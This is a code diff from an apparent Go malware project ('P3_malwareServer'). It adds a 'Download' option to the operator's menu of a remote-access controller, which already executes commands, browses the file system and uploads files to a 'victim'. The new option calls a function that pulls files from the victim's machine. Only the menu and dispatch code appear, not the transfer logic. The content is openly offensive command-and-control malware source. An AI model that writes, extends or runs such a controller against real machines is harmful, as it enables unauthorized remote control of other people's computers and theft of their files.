@@ -6,6 +6,7 @@ import (
 	"golang-hacking/P3_malwareServer/core/ExecuteCommandWindows"
 	"golang-hacking/P3_malwareServer/core/Move"
 	"golang-hacking/P3_malwareServer/core/Upload"
+	"golang-hacking/P3_malwareServer/core/download"
 	"golang-hacking/P3_malwareServer/core/handleConnection"
 	"log"
 	"os"
@@ -28,6 +29,7 @@ func options() {
 	fmt.Println("\t[1] Execute Command")
 	fmt.Println("\t[2] Move in File system")
 	fmt.Println("\t[3] UploadFile")
+	fmt.Println("\t[4] Download")
 	fmt.Println("\t[99] Exit")
 	fmt.Println()
 }
@@ -73,6 +75,11 @@ func main() {
 		case user_input == "3":
 			fmt.Println("[+] Uploading File to the Victim")
 			err = Upload.UploadFile2Victim(connection)
+			DisplayError(err)
+
+		case user_input == "4":
+			fmt.Println("[+] Downloading File from the victim ")
+			err = download.DownloadFromVictim(connection)
 			DisplayError(err)
 
 		case user_input == "99":
